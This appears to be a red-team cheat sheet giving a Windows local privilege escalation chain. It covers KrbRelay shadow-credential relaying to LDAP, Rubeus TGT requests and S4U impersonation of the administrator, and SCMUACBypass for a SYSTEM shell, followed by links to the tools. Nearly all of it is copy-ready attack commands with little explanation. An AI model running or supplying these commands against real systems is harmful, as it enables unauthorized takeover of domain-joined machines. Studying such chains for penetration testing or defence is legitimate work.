# Coercion Attack

## Prerequisites
```
LDAP Signing should not to be enforced
```

### Adding a Shadow Credential to local machine
```
KrbRelay.exe -spn ldap/<domainControllerFqdn> -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred
```

### Get TGT for local admin
```
Rubeus.exe asktgt /user:<computer$> /certificate:<certificate> /password:<password> /enctype:AES256 /nowrap
```

### 
```
Rubeus.exe s4u /self /user:<computer$> /impersonateuser:administrator /altservice:host/<computer> /ptt /ticket:<base64Ticker>
```

### Get SYSTEM cmd shell
```
SCMUACBypass.exe
```

## Tools / References
* https://github.com/cube0x0/KrbRelay
* https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe
* https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1
* https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82 (compile using: cl -DUNICODE SCMUACBypass.cpp advapi32.lib)
* https://github.com/eladshamir/Whisker
* https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html

